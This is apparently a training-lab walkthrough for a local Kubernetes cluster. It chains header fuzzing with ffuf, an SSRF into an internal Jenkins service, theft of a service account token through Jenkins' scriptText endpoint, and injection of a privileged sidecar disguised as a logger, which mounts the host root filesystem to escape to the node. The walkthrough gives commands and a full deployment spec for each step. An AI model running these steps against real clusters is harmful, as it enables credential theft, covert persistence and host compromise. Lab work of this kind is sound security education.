# Getting Setup

## Start the cluster
```
kind delete cluster
./setup.sh
```

## Check the deployment status
```
kubectl get pods
```

You can hit the externally facing API gateway hitting `http://localhost:31337/api`.

For example `curl http://localhost:31337/api`.

# Exploit an SSRF flaw in the gateway
*ps there is actually another way to gain access to the jenkins instance. see if you can figure it out*

## Discover the HTTP headers that trigger a different behavior from the gateway

You can do this with pretty much any tool you like, but we're going to use ffuf because it's 1337 and fast. This command will fuzz for headers using a list from seclists. It will match against some interesting response status codes. Additionally, it will save the request-response pairs to the directory `req_res` so that you can examine them for interesting response bodies.

```
ffuf -w /opt/samurai/wordlists/seclists/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers:FUZZ -u http://localhost:31337/api -H "FUZZ: foo" -c -mc 200,403,500,503 -od req_res
```

You can also proxy the traffic from ffuf through BurpSuite if you want using `-x 127.0.0.1:8080`

When we discover a HTTP header that gives us an interesting response such as a 500, we can then fuzz the value of said header.

```
ffuf -w k8s-labs/payloads/wordlist -u http://localhost:31337/ -H "X-Original-Host: http://FUZZ:8080" -c -od req_res -x 127.0.0.1:8080
```

For this one we are looking for indications that the backend is trying to resolve the values to IP addresses. So, for example if we get an error message that seems to indicate that it failed to resolve, then we know that value is not a viable SSRF target. However, if a value causes a timeout, or possibly a different error, then we can guess that it might likely be a viable target, for which we would need to then try to guess a port number for.

## Hit the jenkins service through SSRF
```
curl http://localhost:31337 -H "X-Original-Host: http://jenkinssvc:8080"
```

We should see a resonse which is the Jenkins dashboard comeback. Indicating that we were able to hit a internal Jenkins service via the API gateway SSRF.

# Exploit the access to Jenkins
To do this we can use the raw HTTP request which is found in the file `k8s-labs/payloads/jenkinsexploit.http`. This is just a convenience to exploit the `scriptText` endpoint which Jenkins has enabled by default. This particular payload will exfiltrate the Jenkins containers kubernetes secret for us, which we can then use with `kubectl` to further expand our access to the cluster.

You could also use a different Groovy payload here, such as a reverse shell to gain a shell into the Jenkins container, and go from there. Try it out!

## Use the stolen kubernetes service account token to do sidecar injection
This is pretty much the final step. We can check and see what the stolen service account token allows us to do, and the abuse it's capabilities to inject a sneaky sidecar container that allows us to escape to the host node.

Set the token as an env var in your terminal.
```
export JWT="<jwt value here>"
```

Check it's capabilities.
```
kubectl --token=$JWT auth can-i --list
```

Inject a side-car container to the jenkins service which looks like a logging sidecar.

```
kubectl --token=$JWT edit deployment jenkinssvc
```

We want to edit the deployment to look like the deployment spec below.
The regions that are updates are surrouned with the following string

```
# ===================================
```

### Modifed Spec

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  annotations:
    deployment.kubernetes.io/revision: "2"
  creationTimestamp: "2023-11-01T18:33:36Z"
  generation: 2
  labels:
    app: jenkinssvc
  name: jenkinssvc
  namespace: default
  resourceVersion: "12117"
  uid: 58eedc88-93f6-4030-9534-0e9b875abba4
spec:
  progressDeadlineSeconds: 600
  replicas: 1
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      app: jenkinssvc
  strategy:
    rollingUpdate:
      maxSurge: 25%
      maxUnavailable: 25%
    type: RollingUpdate
  template:
    metadata:
      creationTimestamp: null
      labels:
        app: jenkinssvc
    spec:
      containers:
      # ===================================
      - command:
        - sleep
        - infinity
        image: k8s-labs-base:v1
        imagePullPolicy: IfNotPresent
        name: jenkins-logging-sidecar
        resources: {}
        securityContext:
          privileged: true
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /mnt
          mountPropagation: Bidirectional
          name: log-volume
      # ===================================
      - env:
        - name: JAVA_OPTS
          value: -Djenkins.install.runSetupWizard=false
        image: k8s-labs-jenkinssvc:v1
        imagePullPolicy: IfNotPresent
        name: jenkinssvc
        ports:
        - containerPort: 8080
          name: http-port
          protocol: TCP
        - containerPort: 50000
          name: jnlp-port
          protocol: TCP
        resources: {}
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /var/jenkins_home
          name: jenkins-home
      dnsPolicy: ClusterFirst
      restartPolicy: Always
      schedulerName: default-scheduler
      securityContext: {}
      serviceAccount: deploy-manager-sa
      serviceAccountName: deploy-manager-sa
      terminationGracePeriodSeconds: 30
      volumes:
      # ===================================
      - hostPath:
          path: /
          type: ""
        name: log-volume
      # ===================================
      - emptyDir: {}
        name: jenkins-home
status:
  availableReplicas: 1
  conditions:
  - lastTransitionTime: "2023-11-01T18:33:39Z"
    lastUpdateTime: "2023-11-01T18:33:39Z"
    message: Deployment has minimum availability.
    reason: MinimumReplicasAvailable
    status: "True"
    type: Available
  - lastTransitionTime: "2023-11-01T18:33:36Z"
    lastUpdateTime: "2023-11-01T19:12:33Z"
    message: ReplicaSet "jenkinssvc-7ddbf46c7f" has successfully progressed.
    reason: NewReplicaSetAvailable
    status: "True"
    type: Progressing
  observedGeneration: 2
  readyReplicas: 1
  replicas: 1
  updatedReplicas: 1
```

Once that successfully updates we can exec into our new container.

```
kubectl --token=$JWT exec jenkinssvc-<hash_here> -it --container jenkins-logging-sidecar -- /bin/bash
```

Once we have the shell in the sidecar container we can modify the host node filesystem by writing a flag to `/mnt/flag.txt`. 

You can check the file was created on the node filesystem with the following command in another terminal.

```
docker exec kind-control-plane -- ls /flag.txt
```

## That's it!

You are of course free to tinker further, but that demonstrates the ability to compromise the host node using a bidirectional volume mount from within a sidecar container!
